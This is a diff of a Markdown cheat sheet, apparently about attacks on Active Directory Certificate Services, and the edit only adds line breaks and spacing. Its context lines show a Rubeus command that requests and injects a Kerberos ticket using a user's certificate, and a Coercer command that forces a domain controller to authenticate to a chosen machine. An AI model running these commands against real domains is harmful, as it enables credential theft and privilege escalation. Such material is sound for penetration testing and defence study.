@@ -49,10 +49,11 @@
 
 ------------------------------------
 
+<br>
 
 # <a name="1"></a>1. General
 
-### <a name="11"></a>1.1 Enumeration
+### <a name="11"></a>1.1    Enumeration
 
 Enumerate Certificate Authorities:
 
@@ -237,9 +238,11 @@ certreq -enroll -user -q -cert CERT_HASH renew
 C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /nowrap /ptt
 ```
 
+<br>
 
 ----------------------------------
 
+<br>
 
 # <a name="2"></a>ESCx Abuses
 
@@ -488,7 +491,11 @@ source coercer_venv/bin/activate
 /opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
 ```
 
+<br>
+
 ----------------------------------
+
+<br>
 
 # <a name="3">3. Sources
 
